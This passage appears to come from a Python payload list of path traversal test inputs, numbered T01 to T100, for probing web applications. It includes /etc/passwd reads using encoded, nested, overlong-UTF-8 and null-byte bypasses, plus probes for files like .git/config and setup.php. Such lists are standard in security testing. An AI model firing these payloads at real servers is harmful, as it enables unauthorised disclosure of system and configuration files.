    ("T01", "Absolute path", "/etc/passwd"),
    ("T02", "Simple traversal ../ x6", "../../../../../../etc/passwd"),
    ("T03", "Nested traversal ....// x3", "....//....//....//etc/passwd"),
    ("T04", "Nested traversal ....\\/ x3", "....\\\\/....\\\\/....\\\\/etc/passwd"),
    ("T05", "Single URL-encoded ../ x3", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"),
    ("T06", "Double URL-encoded ../ x3", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"),
    ("T07", "Non-standard ..%c0%af x3", "..%c0%af..%c0%af..%c0%afetc/passwd"),
    ("T08", "Non-standard ..%ef%bc%8f x3", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"),
    ("T09", "Base-dir bypass /var/www/images", "/var/www/images/../../../etc/passwd"),
    ("T10", "Null byte terminator png", "../../../etc/passwd%00.png"),
    ("T11", "Simple traversal x1 + common", "../common"),
    ("T12", "Simple traversal x2 + common", "../../common"),
    ("T13", "Simple traversal x3 + common", "../../../common"),
    ("T14", "Simple traversal x4 + common", "../../../../common"),
    ("T15", "Simple traversal x5 + common", "../../../../../common"),
    ("T16", "Simple traversal x6 + common", "../../../../../../common"),
    ("T17", "Simple traversal x1 + CVS", "../CVS"),
    ("T18", "Simple traversal x2 + CVS", "../../CVS"),
    ("T19", "Simple traversal x3 + CVS", "../../../CVS"),
    ("T20", "Simple traversal x4 + CVS", "../../../../CVS"),
    ("T21", "Simple traversal x5 + CVS", "../../../../../CVS"),
    ("T22", "Simple traversal x6 + CVS", "../../../../../../CVS"),
    ("T23", "Simple traversal x1 + root", "../root"),
    ("T24", "Simple traversal x2 + root", "../../root"),
    ("T25", "Simple traversal x3 + root", "../../../root"),
    ("T26", "Simple traversal x4 + root", "../../../../root"),
    ("T27", "Simple traversal x5 + root", "../../../../../root"),
    ("T28", "Simple traversal x6 + root", "../../../../../../root"),
    ("T29", "Simple traversal x1 + Entries", "../Entries"),
    ("T30", "Simple traversal x2 + Entries", "../../Entries"),
    ("T31", "Simple traversal x3 + Entries", "../../../Entries"),
    ("T32", "Simple traversal x4 + Entries", "../../../../Entries"),
    ("T33", "Simple traversal x5 + Entries", "../../../../../Entries"),
    ("T34", "Simple traversal x6 + Entries", "../../../../../../Entries"),
    ("T35", "Simple traversal x1 + .git/config", "../.git/config"),
    ("T36", "Simple traversal x2 + .git/config", "../../.git/config"),
    ("T37", "Simple traversal x3 + .git/config", "../../../.git/config"),
    ("T38", "Simple traversal x4 + .git/config", "../../../../.git/config"),
    ("T39", "Simple traversal x5 + .git/config", "../../../../../.git/config"),
    ("T40", "Simple traversal x6 + .git/config", "../../../../../../.git/config"),
    ("T41", "Simple traversal x1 + lang", "../lang"),
    ("T42", "Simple traversal x2 + lang", "../../lang"),
    ("T43", "Simple traversal x3 + lang", "../../../lang"),
    ("T44", "Simple traversal x4 + lang", "../../../../lang"),
    ("T45", "Simple traversal x5 + lang", "../../../../../lang"),
    ("T46", "Simple traversal x6 + lang", "../../../../../../lang"),
    ("T47", "Simple traversal x1 + test.zip", "../test.zip"),
    ("T48", "Simple traversal x2 + test.zip", "../../test.zip"),
    ("T49", "Simple traversal x3 + test.zip", "../../../test.zip"),
    ("T50", "Simple traversal x4 + test.zip", "../../../../test.zip"),
    ("T51", "Simple traversal x5 + test.zip", "../../../../../test.zip"),
    ("T52", "Simple traversal x6 + test.zip", "../../../../../../test.zip"),
    ("T53", "Simple traversal x1 + home.php", "../home.php"),
    ("T54", "Simple traversal x2 + home.php", "../../home.php"),
    ("T55", "Simple traversal x3 + home.php", "../../../home.php"),
    ("T56", "Simple traversal x4 + home.php", "../../../../home.php"),
    ("T57", "Simple traversal x5 + home.php", "../../../../../home.php"),
    ("T58", "Simple traversal x6 + home.php", "../../../../../../home.php"),
    ("T59", "Simple traversal x1 + setup.php", "../setup.php"),
    ("T60", "Simple traversal x2 + setup.php", "../../setup.php"),
    ("T61", "Simple traversal x3 + setup.php", "../../../setup.php"),
    ("T62", "Simple traversal x4 + setup.php", "../../../../setup.php"),
    ("T63", "Simple traversal x5 + setup.php", "../../../../../setup.php"),
    ("T64", "Simple traversal x6 + setup.php", "../../../../../../setup.php"),
    ("T65", "Simple traversal x1 + install.txt", "../install.txt"),
    ("T66", "Simple traversal x2 + install.txt", "../../install.txt"),
    ("T67", "Simple traversal x3 + install.txt", "../../../install.txt"),
    ("T68", "Simple traversal x4 + install.txt", "../../../../install.txt"),
    ("T69", "Simple traversal x5 + install.txt", "../../../../../install.txt"),
    ("T70", "Simple traversal x6 + install.txt", "../../../../../../install.txt"),
    ("T71", "Simple traversal x1 + default", "../default"),
    ("T72", "Simple traversal x2 + default", "../../default"),
    ("T73", "Simple traversal x3 + default", "../../../default"),
    ("T74", "Simple traversal x4 + default", "../../../../default"),
    ("T75", "Simple traversal x5 + default", "../../../../../default"),
    ("T76", "Simple traversal x6 + default", "../../../../../../default"),
    ("T77", "Simple traversal x1 + init.php", "../init.php"),
    ("T78", "Simple traversal x2 + init.php", "../../init.php"),
    ("T79", "Simple traversal x3 + init.php", "../../../init.php"),
    ("T80", "Simple traversal x4 + init.php", "../../../../init.php"),
    ("T81", "Simple traversal x5 + init.php", "../../../../../init.php"),
    ("T82", "Simple traversal x6 + init.php", "../../../../../../init.php"),
    ("T83", "Simple traversal x1 + Repository", "../Repository"),
    ("T84", "Simple traversal x2 + Repository", "../../Repository"),
    ("T85", "Simple traversal x3 + Repository", "../../../Repository"),
    ("T86", "Simple traversal x4 + Repository", "../../../../Repository"),
    ("T87", "Simple traversal x5 + Repository", "../../../../../Repository"),
    ("T88", "Simple traversal x6 + Repository", "../../../../../../Repository"),
    ("T89", "Simple traversal x1 + en.php", "../en.php"),
    ("T90", "Simple traversal x2 + en.php", "../../en.php"),
    ("T91", "Simple traversal x3 + en.php", "../../../en.php"),
    ("T92", "Simple traversal x4 + en.php", "../../../../en.php"),
    ("T93", "Simple traversal x5 + en.php", "../../../../../en.php"),
    ("T94", "Simple traversal x6 + en.php", "../../../../../../en.php"),
    ("T95", "Simple traversal x1 + .project", "../.project"),
    ("T96", "Simple traversal x2 + .project", "../../.project"),
    ("T97", "Simple traversal x3 + .project", "../../../.project"),
    ("T98", "Simple traversal x4 + .project", "../../../../.project"),
    ("T99", "Simple traversal x5 + .project", "../../../../../.project"),
    ("T100", "Simple traversal x6 + .project", "../../../../../../.project"),
